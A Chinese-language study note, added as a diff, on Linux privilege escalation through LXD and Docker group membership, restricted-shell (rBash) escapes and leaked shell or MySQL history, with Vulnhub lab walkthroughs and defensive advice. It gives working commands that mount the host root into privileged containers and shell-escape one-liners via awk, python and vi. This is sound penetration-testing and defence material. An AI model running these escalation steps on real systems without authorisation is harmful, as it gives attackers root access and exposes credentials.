@@ -1,0 +1,269 @@
+## 1. 概述
+
+本文档是一份关于 Linux 系统下权限提升技术的学习笔记，专注于几种常见的提权向量：**LXD 容器**、**Docker 容器**、**rBash (Restricted Shell) 绕过**以及**历史命令泄露**。在渗透测试或红队演练中，获取初始立足点后，权限提升是控制目标系统的关键一步。本文将结合技术原理与 Vulnhub 靶场实战案例，详细剖析每种技术的利用条件、攻击流程和防御思路，旨在为安全研究人员和系统管理员提供一份结构清晰、内容详实的参考指南。
+
+### 1.1. 容器技术简介
+
+在深入探讨提权技术之前，我们先简要区分三种相关的容器化技术：LXC、LXD 和 Docker。
+
+*   **LXC (Linux Containers)**：是 Linux 内核提供的一种操作系统层虚拟化技术。它允许在单个 Linux 内核上运行多个相互隔离的用户空间实例（即容器）。LXC 提供了创建和管理容器的基础工具和 API，特点是轻量、灵活，适合需要对底层进行精细控制的场景。
+
+*   **LXD (Linux Container Daemon)**：是一个基于 LXC 的系统级容器管理器。它提供了一个更高级别的守护进程和友好的命令行工具（如 `lxc`），极大地简化了“系统容器”（运行完整操作系统的容器，类似轻量级虚拟机）的创建和管理。LXD 提供了更强的隔离性、资源控制和安全性。
+
+*   **Docker**：是一个开源的应用容器化平台，它最初也基于 LXC，但后来发展了自己的容器运行时（`containerd`）。Docker 的核心理念是“构建、分发、运行”，它通过镜像打包应用及其所有依赖，实现了跨环境的高度可移植性。Docker 主要面向“应用容器”，适用于开发、测试和部署应用程序的场景。
+
+总结来说，LXC 是底层技术，LXD 是系统容器管理器，而 Docker 是应用容器平台。在提权场景中，如果攻击者所在的账户拥有管理这些容器的权限，就可能利用它们来突破隔离，访问宿主机资源。
+
+## 2. 技术原理
+
+### 2.1. LXD/Docker 容器提权原理
+
+当一个普通用户被授予管理 LXD 或 Docker 的权限时（通常表现为该用户属于 `lxd` 或 `docker` 用户组），就产生了提权风险。其核心原理如下：
+
+1.  **权限继承**：Docker Daemon 和 LXD Daemon 通常以 `root` 权限在宿主机上运行。
+2.  **挂载宿主机文件系统**：用户可以创建一个新的容器，并在创建时指定一个特殊的配置——将宿主机的根目录 (`/`) 挂载到容器内部的某个目录（例如 `/mnt/root`）。
+3.  **容器内操作宿主机**：启动容器后，用户可以进入该容器的 shell。由于宿主机的整个文件系统已经挂载到容器内，用户在容器内就拥有了对这个挂载目录的完全读写权限。
+4.  **实现提权**：攻击者可以在容器内修改宿主机上的敏感文件，例如 `/etc/passwd`、`/etc/sudoers`，或者直接访问 `root` 用户的家目录、SSH 密钥等，从而获得宿主机的 `root` 权限。
+
+简而言之，攻击者利用了容器引擎的合法功能（挂载卷），但将其用于恶意目的，将宿主机的文件系统当作一个普通目录来操作，从而打破了容器与宿主机之间的隔离。
+
+### 2.2. rBash 绕过原理
+
+rBash (Restricted Bash) 是一种限制模式的 Shell，旨在将用户锁定在一个特定的目录和一组有限的命令中。其限制通常包括：
+
+*   禁止使用 `cd` 命令更改目录。
+*   禁止修改 `SHELL`, `PATH`, `ENV` 等环境变量。
+*   禁止执行包含 `/` 的命令名（即无法执行绝对或相对路径的命令）。
+*   禁止重定向输出 (`>`, `>>`, `|`, 等)。
+
+绕过 rBash 的核心思路是**找到一个在允许执行的命令范围内，能够调用一个标准 Shell (如 `/bin/bash`) 的方法**。许多编程语言解释器、文本编辑器和系统工具都提供了执行外部命令或进入交互式 Shell 的功能，这些往往成为绕过的突破口。
+
+## 3. 环境准备
+
+要复现这些提权技术，您需要一个标准的 Linux 环境（如 Ubuntu、Debian），并根据需要安装相应的软件。
+
+*   **LXD 环境**：
+    ```bash
+    # 安装 LXD
+    sudo apt update
+    sudo apt install lxd
+    
+    # 初始化 LXD (可使用默认配置)
+    sudo lxd init
+    
+    # 创建一个测试用户并加入 lxd 组
+    sudo adduser testuser
+    sudo usermod -aG lxd testuser
+    ```
+
+*   **Docker 环境**：
+    ```bash
+    # 安装 Docker
+    sudo apt update
+    sudo apt install docker.io
+    
+    # 创建一个测试用户并加入 docker 组
+    sudo adduser testuser
+    sudo usermod -aG docker testuser
+    ```
+
+*   **rBash 环境**：
+    ```bash
+    # 创建一个测试用户
+    sudo adduser rbashuser
+    
+    # 将其默认 Shell 设置为 rbash
+    sudo usermod -s /bin/rbash rbashuser
+    ```
+
+## 4. 实战示例
+
+以下案例均来自 Vulnhub 靶场，展示了真实环境下的攻击流程。
+
+### 4.1. LXD 提权 (靶场: AI: Web 2)
+
+**场景**：已通过 SSH 登录，获得普通用户 `n0nr00tuser` 的 Shell。
+
+**利用条件**：
+*   已获得目标系统的 Shell。
+*   当前用户属于 `lxd` 用户组。
+
+**攻击流程**：
+
+1.  **信息收集**：检查当前用户所属的组。
+    ```bash
+    id
+    # 输出中会包含 lxd，确认条件满足
+    # uid=1001(n0nr00tuser) gid=1001(n0nr00tuser) groups=1001(n0nr00tuser),111(lxd)
+    ```
+
+2.  **准备容器镜像**：在攻击机上，下载或构建一个轻量级的 Alpine Linux 镜像。如果没有现成的镜像，可以使用 `lxd-alpine-builder` 工具构建。
+    ```bash
+    # 在攻击机上操作
+    git clone https://github.com/saghul/lxd-alpine-builder.git
+    cd lxd-alpine-builder
+    sudo ./build-alpine
+    # 执行成功后会在当前目录生成一个 .tar.gz 格式的镜像文件
+    ```
+    将生成的 `alpine-*.tar.gz` 文件上传到目标机器。
+
+3.  **导入并创建容器**：在目标机器上，使用 `lxc` 命令执行提权。
+    ```bash
+    # 1. 导入镜像并设置别名
+    lxc image import ./alpine-v3.13-x86_64-20210218_0139.tar.gz --alias myimage
+    
+    # 2. 初始化容器，关键在于 security.privileged=true
+    lxc init myimage priv-container -c security.privileged=true
+    
+    # 3. 添加设备，将宿主机的根目录 / 挂载到容器的 /mnt/root 目录
+    lxc config device add priv-container host-disk disk source=/ path=/mnt/root recursive=true
+    
+    # 4. 启动容器
+    lxc start priv-container
+    
+    # 5. 进入容器的 Shell
+    lxc exec priv-container /bin/sh
+    ```
+
+4.  **获取 Root 权限**：进入容器后，宿主机的根目录已在 `/mnt/root` 下。
+    ```bash
+    # 在容器内执行
+    cd /mnt/root/root
+    ls
+    # 此处可以查看到宿主机 root 用户的家目录文件
+    cat flag.txt
+    # 提权成功，可以对宿主机任意文件进行读写
+    ```
+
+### 4.2. Docker 提权 (靶场: Chill Hack)
+
+**场景**：已通过 SSH 登录，获得普通用户 `anurodh` 的 Shell。
+
+**利用条件**：
+*   已获得目标系统的 Shell。
+*   当前用户属于 `docker` 用户组。
+
+**攻击流程**：
+
+1.  **信息收集**：检查用户组。
+    ```bash
+    id
+    # 确认用户属于 docker 组
+    # uid=1002(anurodh) gid=1002(anurodh) groups=1002(anurodh),999(docker)
+    ```
+
+2.  **利用 Docker 命令提权**：`docker` 组用户可以直接运行 `docker` 命令，通过 `-v` 参数挂载宿主机目录。
+    ```bash
+    # 运行一个 alpine 容器，并将宿主机的根目录 / 挂载到容器的 /mnt 目录
+    # -v /:/mnt  <-- 这是提权的关键
+    # -it         <-- 提供一个交互式 TTY
+    docker run -v /:/mnt -it alpine
+    ```
+
+3.  **获取 Root 权限**：命令执行后，会直接进入新创建容器的 Shell。
+    ```bash
+    # 在容器内执行
+    # 此时你已经是容器内的 root 用户
+    
+    # 进入挂载的宿主机根目录
+    cd /mnt
+    
+    # 浏览宿主机文件系统
+    ls -la
+    
+    # 进入宿主机的 root 目录
+    cd root
+    
+    # 读取敏感文件
+    cat root.txt
+    ```
+    此时，你可以在容器内对 `/mnt` 目录（即宿主机文件系统）为所欲为。
+
+### 4.3. rBash 绕过与历史泄露提权 (靶场: Funbox: Rookie)
+
+**场景**：通过 FTP 泄露的私钥 `id_rsa` 登录了 `tom` 用户，但发现其 Shell 是 rBash。
+
+**攻击流程**：
+
+1.  **确认 rBash 环境**：登录后，尝试执行 `cd /tmp` 或 `ls /` 等命令会失败，确认是 rBash 环境。
+    ```bash
+    -rbash: cd: restricted
+    ```
+
+2.  **绕过 rBash**：寻找可用的命令来调用标准 Shell。
+    *   **方法一：利用 `awk`**
+        ```bash
+        awk 'BEGIN {system("/bin/bash")}'
+        ```
+        执行后，你会得到一个标准的 Bash Shell，成功绕过限制。
+
+    *   **方法二：利用 `python` 或其他语言**
+        ```bash
+        # 如果 python 可用
+        python -c 'import os; os.system("/bin/bash")'
+        ```
+
+    *   **方法三：利用 `vi`/`vim`**
+        ```bash
+        # 如果 vi 可用
+        vi
+        # 在 vi 编辑器内输入
+        :set shell=/bin/bash
+        :shell
+        ```
+
+3.  **信息收集与历史泄露提权**：成功绕过 rBash 后，进行常规的信息收集。
+    ```bash
+    # 上传并运行 LinEnum.sh 等脚本进行自动化信息收集
+    ./LinEnum.sh
+    
+    # 在脚本输出或手动检查中，发现敏感历史文件
+    cat /home/tom/.mysql_history
+    ```
+
+4.  **利用泄露的凭据**：在 `.mysql_history` 文件中，可能记录了数据库连接的明文密码，而这个密码很可能被复用。
+    ```bash
+    # .mysql_history 文件内容可能如下：
+    # UPDATE mysql.user SET Password=PASSWORD('xx11yy22!') WHERE User='root';
+    
+    # 尝试使用这个密码切换到 root 用户
+    su root
+    # 输入密码: xx11yy22!
+    
+    # 成功切换到 root 用户
+    id
+    # uid=0(root) gid=0(root) groups=0(root)
+    ```
+
+## 5. 关键细节
+
+*   **`security.privileged=true`**：在 LXD 提权中，这个参数至关重要。它禁用了容器的安全特性，使得容器内的进程拥有与宿主机上直接运行的进程几乎相同的内核权限，这是成功挂载和操作宿主机文件系统的关键。
+
+*   **`newgrp docker` 命令**：当一个用户被添加到 `docker` 组后，这个变更在当前的登录会话中不会立即生效。用户需要重新登录，或者使用 `newgrp docker` 命令来开启一个具有 `docker` 组权限的新 Shell，才能执行 `docker` 命令。
+
+*   **rBash 绕过向量**：可用于绕过 rBash 的命令非常多，包括但不限于 `awk`, `python`, `perl`, `ruby`, `lua`, `php`, `find -exec`, `more/less` (通过 `!`), `man` (通过 `!`), `gdb`, `scp` 等。渗透测试时需要根据目标系统上已安装的软件进行尝试。
+
+*   **历史文件**：除了 `.mysql_history`，其他值得关注的历史文件还包括 `.bash_history`, `.zsh_history`, `.psql_history`, `.rediscli_history` 等，它们都可能泄露敏感凭据。
+
+## 6. 安全总结与防御建议
+
+理解这些提权技术后，防御就变得更有针对性。
+
+*   **最小权限原则**：
+    *   **不要**将不受信任的用户或非管理员用户添加到 `docker` 或 `lxd` 组。这些组应被视为等同于 `root` 权限。
+    *   使用 `sudo` 来授予用户执行特定 `docker` 或 `lxc` 命令的权限，而不是直接给予组权限。
+
+*   **加固 rBash**：
+    *   严格限制 rBash 环境下 `PATH` 变量中的可用命令，只保留绝对必要且安全的命令。
+    *   移除所有可能用于调用 Shell 的工具，如编程语言解释器、文本编辑器的高级功能等。
+    *   考虑使用更安全的 Shell 限制方案，如 `chroot` jail 或专门的限制性 Shell 工具。
+
+*   **凭据管理**：
+    *   教育用户不要在命令行中直接输入明文密码，尤其是在连接数据库等服务时。应优先使用配置文件、环境变量或专门的凭据管理工具。
+    *   定期审计和清理服务器上的各类历史记录文件。
+
+*   **监控与审计**：
+    *   监控 `docker` 和 `lxd` 组的成员变更。
+    *   审计 Docker 和 LXD 的 API 调用日志，特别是创建具有特权或挂载敏感宿主机目录的容器的行为。
+
+通过遵循这些安全实践，可以显著降低因配置不当而导致权限提升的风险。
